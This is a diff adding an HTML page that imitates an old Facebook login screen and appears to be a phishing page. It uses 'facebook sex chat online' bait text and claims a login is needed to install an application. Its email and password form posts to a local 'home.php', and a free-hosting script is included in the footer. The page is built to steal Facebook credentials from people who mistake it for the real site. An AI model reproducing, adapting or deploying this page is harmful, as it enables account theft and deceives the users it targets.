@@ -1,0 +1,147 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html lang="en" xml:lang="en" id="facebook" class=" no_js">
+    <head>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-type" />
+        <meta content="en" http-equiv="Content-language" />
+        <meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible" /> <script type="text/javascript">
+//<![CDATA[
+(function(loc) { if (loc.pathname == '/') { return; } var uri_re = /^(?:(?:[^:\/?#]+):)?(?:\/\/(?:[^\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?/; var target_domain = ''; loc.href.replace(uri_re, function(all, path, query, frag) { var dst, src; dst = src = path + (query ? '?' + query : ''); if (frag) { if (frag.charAt(0) == '/') { dst = frag.replace(/^\/+/, '/') .replace(/_fb_qsub=([^&]+)&?/, function(all, domain){ if (domain.substring(domain.length - 13) == '.facebook.com') { target_domain = 'http://'+domain; } return ''; }); } else if (/&|=/.test(frag)) { var q = {}; var m = frag.match(/([^#]*)(#.*)?/); var arr = (query||'').split('&').concat((m[1]||'').split('&')); for (var i=0, length=arr.length; i<length; i++) { var t = arr[i].split('='); if (t.length && t[0] != '') { q[t[0]] = t[1]; } } var s = []; for (var i in q) { s.push(i+ (q[i]?'='+q[i]:'')); } dst = path+'?'+s.join('&')+(m[2]||''); } } dst = "" + dst; if (dst != src) { window.location.replace(target_domain + dst); } }); })(window.location); !function() { var doc = document, htm = doc.documentElement, phc = 'DOMControl_placeholder', nearest = function(elm, tag) { while (elm && elm.nodeName != tag) { elm = elm.parentNode; } return elm; }, fob = function (e) { var e = e || window.event, elm = e.target || e.srcElement, ph = elm.getAttribute('placeholder'); if (ph) { if ('focus' == e.type || 'focusin' == e.type) { if (elm.value == ph) { elm.value = ''; CSS.removeClass(elm, phc); } } else { if (elm.value == '') { CSS.addClass(elm, phc); elm.value = ph; } } } }; $ = window.$ || function(id) { var e = doc.getElementById(id); return (e && e.getAttribute('id') == id) ? e : null; }; CSS = window.CSS || { addClass : function(e, c) { e.className += ' ' + c; }, removeClass : function(e, c) { e.className = e.className .replace(new RegExp('(^|\\s)' + c + '(?=\\s|$)', 'g'), ' '); } }; Bootloader = window.Bootloader || { _preloaded : [], _callbacks : {}, loadComponents : function(component, callback) { if (callback) { var cb = Bootloader._callbacks; cb[component] = cb[component] || []; cb[component].push(callback); } var script = doc.createElement('script'); script.type = 'text/javascript'; script.src = '/rsrcx.php?boot&enable=' + component; doc.getElementsByTagName('head')[0].appendChild(script); }, done : function(names) { Bootloader._preloaded.push(names); } }; htm.onclick = function(e) { e = e || window.event; var elem = nearest(e.target || e.srcElement, 'A') || htm, href = elem.getAttribute('ajaxify') || elem.href; switch (elem.rel) { case 'dialog': case 'dialog-post': Bootloader.loadComponents('dialog', function() { Dialog.bootstrap(href, null, elem.rel == 'dialog'); }); break; case 'async': Bootloader.loadComponents('async', function() { new AsyncRequest(href) .setReadOnly(true) .setMethod('GET') .setStatusElement(elem) .send(); }); break; default: return; } return false; }; htm.onfocusin = htm.onfocusout = fob; if (htm.addEventListener) { htm.addEventListener('focus', fob, true); htm.addEventListener('blur', fob, true); } CSS.removeClass(htm, 'no_js'); }(); if (navigator && navigator.userAgent && document.domain.toLowerCase().match(/(^|\.)facebook\..*/) && !(parseInt((/Gecko\/([0-9]+)/.exec(navigator.userAgent) || []).pop(), 10) <= 20060508)) { document.domain = window.location.hostname.replace(/^.*(facebook\..*)$/i, '$1'); } var onloadRegister = window.onloadRegister || function(h) { onloadhooks.push(h); }; var onloadhooks = window.onloadhooks || []; var onafterloadRegister = window.onafterloadRegister || function(h) { onafterloadhooks.push(h); }; var onafterloadhooks = window.onafterloadhooks || []; function run_if_loaded(element, f) { f = bind(element, f); if (window.loaded) { return (element.returnValue = f()); } }; function run_now(element, f) { f = bind(element, f); return (element.returnValue = f()); }; function run_with(element, deps, f) { f = bind(element, f); Bootloader.loadComponents(deps, function() { element.returnValue = f(); }); return false; } function wait_for_load(element, e, f) { f = bind(element, f, e); if (window.loaded) { return (element.returnValue = f()); } switch ((e || event).type) { case 'load': case 'focus': onloadRegister(f); return; case 'click': var es = element.style, ds = document.body.style; es.cursor = ds.cursor = 'progress'; onafterloadRegister(function() { es.cursor = ds.cursor = ''; if (element.tagName.toLowerCase() == 'a') { if (false !== f() && element.href) { window.location.href = element.href; } } else if (element.click) { element.click(); } }); break; } return false; }; function bind(obj, method ) { var args = []; for (var ii = 2; ii < arguments.length; ii++) { args.push(arguments[ii]); } var fn = function() { var _obj = obj || (this == window ? false : this); var _args = args.slice(); for (var jj = 0; jj < arguments.length; jj++) { _args.push(arguments[jj]); } if (typeof(method) == "string") { if (_obj[method]) { return _obj[method].apply(_obj, _args); } } else { return method.apply(_obj, _args); } }; if (typeof method == 'string') { fn.name = method; } else if (method && method.name) { fn.name = method.name; } fn.toString = function() { return bind._toString(obj, args, method); }; return fn; }; var curry = bind(null, bind, null); bind._toString = bind._toString || function(obj, args, method) { return (typeof method == 'string') ? ('late bind<'+method+'>') : ('bound<'+method.toString()+'>'); }; window.loadFirebugConsole && loadFirebugConsole();CavalryLogger=false;
+//]]>
+</script><noscript> <meta http-equiv=refresh content="0; URL=?_fb_noscript=1" /> </noscript>
+        <meta content="noodp,noydir" name="robots" />
+        <meta content=" Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." name="description" />
+        <title>Login | Facebook</title>
+        <script type="text/javascript">
+Env={method:"GET",dev:0,start:(new Date()).getTime(),ps_limit:5,ps_ratio:4,svn_rev:189811,static_base:"http:\/\/static.ak.fbcdn.net\/",www_base:"http:\/\/www.facebook.com\/",tlds:["com","at","ca","co.nz","co.za","com.au","dk","es","ie","jp","net.nz","no","pl","se","vn"],rep_lag:2,pc:{"m":"0.1.0","l":"0.1.0"},fb_dtsg:null};
+</script>      <script type="text/javascript" src="http://static.ak.fbcdn.net/rsrc.php/zQ3IT/hash/65v3rbjz.js"></script> <script type="text/javascript">InitialJSLoader.load([{"name":"js\/9uyuswc20iog0kck.pkg.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z9KUA\/hash\/2w3y2b5q.js","permanent":false},{"name":"js\/vnvcgyxnr6okcsos.pkg.js","type":"js","src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z760A\/hash\/25anqnkh.js","permanent":false}])</script>
+        <link href="http://b.static.ak.fbcdn.net/rsrc.php/z9YSL/hash/90ouedpu.css" rel="stylesheet" type="text/css" />
+        <link href="http://static.ak.fbcdn.net/rsrc.php/zELN9/hash/c7h3cyeq.css" rel="stylesheet" type="text/css" />
+        <link href="hash/6xyzwp5u.css" rel="stylesheet" type="text/css" />
+        <link href="http://static.ak.fbcdn.net/rsrc.php/z9BOB/hash/nvm373u2.css" rel="stylesheet" type="text/css" />
+        <link href="http://static.ak.fbcdn.net/rsrc.php/zB86T/hash/34bqrd8o.css" rel="stylesheet" type="text/css" />
+        <link href="http://static.ak.fbcdn.net/rsrc.php/zD0P5/hash/8oiuirlq.css" rel="stylesheet" type="text/css" />  <!--[if lte IE 6]><link rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/zB1WO/hash/c5zu0405.css" type="text/css" /><![endif]--> <!--[if IE 7]><link rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/z690F/hash/5pwsqvbc.css" type="text/css" /><![endif]-->
+        <link title="Facebook" href="http://b.static.ak.fbcdn.net/rsrc.php/z7J29/hash/4qfe7esg.xml" type="application/opensearchdescription+xml" rel="search" />
+        <link href="http://static.ak.fbcdn.net/rsrc.php/z9Q0Q/hash/8yhim1ep.ico" rel="shortcut icon" />
+    </head>
+    <body class="login_page ff3 Locale_en_US UIPage_LoggedOut">
+        <div style="position: absolute; top: -10000px; width: 0px; height: 0px;" id="FB_HiddenContainer">&#160;</div>
+        <div class="fb_menubar_show_register" id="menubar_container">
+        <div class="fb_menubar_logged_out clearfix" id="fb_menubar" onmouseover="if (window.delay_add_class) {DOM.scry(this, &quot;li.fb_menu&quot;).map(function(e) {delay_add_class(e, &quot;hovered&quot;, 250)});this.onmouseover = null;}">
+        <ul class="fb_menu_list" id="fb_menubar_core">
+            <li id="fb_menubar_logo" class="fb_menu"><a title="Go to Facebook Home" class="fb_logo_link" href="http://www.facebook.com"><img src="http://static.ak.fbcdn.net/rsrc.php/z12E0/hash/8q2anwu7.gif" class="fb_logo_img" alt="Facebook logo" /></a></li>
+        </ul>
+        </div>
+        <div class="signup_bar_container">
+        <div class="signup_box clearfix"><span>facebook chat online sex makes you connect with each user's network of social sex in your life</span></div>
+        </div>
+        </div>
+        <div class="fb_content clearfix" id="content">
+        <div class="UIFullPage_Container">
+        <div class="UIInterstitialContainer clearfix">
+        <div class="UIRoundedTransparentBox">
+        <div class="UIRoundedTransparentBox_Inner clearfix">
+        <div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_TL">&#160;</div>
+        <div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_TR">&#160;</div>
+        <div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_BL">&#160;</div>
+        <div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_BR">&#160;</div>
+        <div class="UIRoundedTransparentBox_Border clearfix">
+        <div class="UIInterstitialBox_Container clearfix">
+        <div>
+        <div class="title_header add_border">
+        <h2 class="title_h no_icon">facebook sex chat online</h2>
+        </div>
+        <form id="login_form" action="home.php" method="POST">
+            <input type="hidden" value="&#8364;,&#180;,&#8364;,&#180;,?,?,?" name="charset_test" />
+            <div class="UIMessageBox status" id="standard_status">
+            <h2 class="main_message">You have to login to the application can be installed in your facebook account.</h2>
+            <p class="sub_message">&#160;</p>
+            </div>
+            <div style="" id="loginform"><input type="hidden" value="http://www.facebook.com/" name="next" id="next" /><input type="hidden" value="1.0" name="version" id="version" /><input type="hidden" value="0" name="return_session" id="return_session" /><input type="hidden" value="&#8364;,&#180;,&#8364;,&#180;,?,?,?" name="charset_test" /><input type="hidden" value="IIVDs" name="lsd" id="lsd" />
+            <div class="form_row clearfix "><label id="label_email" for="email">Email:</label><input type="text" onkeypress="formchange()" value="" name="email" id="email" class="inputtext" /></div>
+            <div class="form_row clearfix "><label id="label_pass" for="pass">Password:</label><input type="password" value="" name="pass" id="pass" class="inputpassword" /></div>
+            <label class="persistent"><input type="checkbox" value="1" name="persistent" id="persistent_inputcheckbox" class="inputcheckbox " /><span id="remember_me_text">Remember me</span></label>
+            <div class="form_row clearfix" id="buttons"><input type="submit" class="inputsubmit" onclick="this.disabled=true; this.form.submit(); return false;" id="login" name="login" value="Login" /> or <strong><a rel="nofollow" target="_blank" href="http://www.facebook.com/r.php">Sign up for Facebook</a></strong></div>
+            <p class="reset_password form_row"><a href="http://www.facebook.com/reset.php?locale=en_US">Forgot your password?</a></p>
+            </div>
+        </form>
+        </div>
+        </div>
+        </div>
+        </div>
+        </div>
+        <div>
+        <div class="linear_language">
+        <ul>
+            <li>&#160;</li>
+        </ul>
+        </div>
+        </div>
+        </div>
+        </div>
+        </div>
+        <div class="clearfix" id="pagefooter">
+        <div class="copyright_and_location clearfix">
+        <div id="pagefooter_copyright" class="copyright"><span title="PHP">Facebook </span><span title="108" id="rtime">&#169;</span> <span title="10.18.156.103">20</span><span title="20083952">09</span></div>
+        <div id="locale_selector_dialog_onclick"><a title="English (US)" class="intl_selector_dialog_a" href="/ajax/intl/language_dialog.php?uri=http%3A%2F%2Fwww.facebook.com%2Flogin.php" rel="dialog">English (US)</a></div>
+        </div>
+        <div id="pagefooter_links">
+        <ul id="pagefooter_left_links" class="pagefooter_ul">
+            <li class="pagefooter_li">
+            <div id="js_buffer"><script type="text/javascript">
+
+onloadRegister(function(){Bootloader.configurePage({"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z9YSL\/hash\/90ouedpu.css":["css\/ayy72px8y00g0g8s.pkg.css",true],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zELN9\/hash\/c7h3cyeq.css":["css\/login.css",false],"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z64MH\/hash\/6xyzwp5u.css":["css\/63g4g7tl5hs84kow.pkg.css",false],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z9BOB\/hash\/nvm373u2.css":["css\/4t9xfqfq7sw00wgg.pkg.css",true],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zB86T\/hash\/34bqrd8o.css":["css\/3vi11zh8tv28sgg0.pkg.css",false],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zD0P5\/hash\/8oiuirlq.css":["css\/2ecacu3qoow00okg.pkg.css",true]});
+Bootloader.done(["css\/ayy72px8y00g0g8s.pkg.css","css\/login.css","css\/63g4g7tl5hs84kow.pkg.css","css\/4t9xfqfq7sw00wgg.pkg.css","css\/3vi11zh8tv28sgg0.pkg.css","css\/2ecacu3qoow00okg.pkg.css","js\/lib\/primer.js","js\/lib\/prelude.js","js\/login.js"]);
+});
+
+onloadRegister(function (){window.loading_page_chrome = true;;});
+onloadRegister(function (){window.loading_page_chrome = false;;});
+onloadRegister(function (){ffid='cFMWrBGpOrvRSKoLjmyfBQ==';ffver='58931';;});
+onafterloadRegister(function (){onbeforeunloadRegister(function(){window.ExitTime=((new Date()).getTime());});});
+
+
+</script></div>
+            <script type="text/javascript">if (!window.ge) {
+  window.ge = function(id) {
+    return document.getElementById(id);
+  }
+}
+
+window.onload = function() {
+  document.cookie = "test_cookie=1;domain=.facebook.com";
+  var e = ge('email'),
+      p = ge('pass');
+
+  //  We sometimes show you *only* a password prompt, so focus that if there
+  //  is no e-mail prompt.
+
+  try {
+    if (e && !e.value) {
+      e.focus();
+    } else if (p) {
+      p.focus();
+    }
+  } catch (x) {
+    if (x.number == -2146826178) {
+      // this is a focus error that happens in IE when the fields are
+      // hidden in order to show the "Sign Up" prompt when a user
+      // arrives with 0 facebook cookies.
+    } else {
+      throw x;
+    }
+  }
+};
+
+function formchange() {
+  (ge('persistent')||{}).checked = 0;
+}
+
+function pop(url) {
+  window.open(url);
+}
+</script><script>Arbiter.inform(Arbiter.LAST_PAGELET,true,Arbiter.BEHAVIOR_STATE)</script> <!-- Free Web Hosting Area Start --> <script type="text/javascript" src="http://a.freewebhostingarea.com/users/all.js"></script> <noscript><br /><center><font color='#000000' face='Verdana' style='font-size: 11px; background-color:#FFFFFF'><a target='_blank' href='http://www.freewebhostingarea.com'><font color='#000000'>Free Web Hosting</font></a></font></center></noscript> <!-- Free Web Hosting Area End --></li>
+        </ul>
+        </div>
+        </div>
+    </body>
+</html>
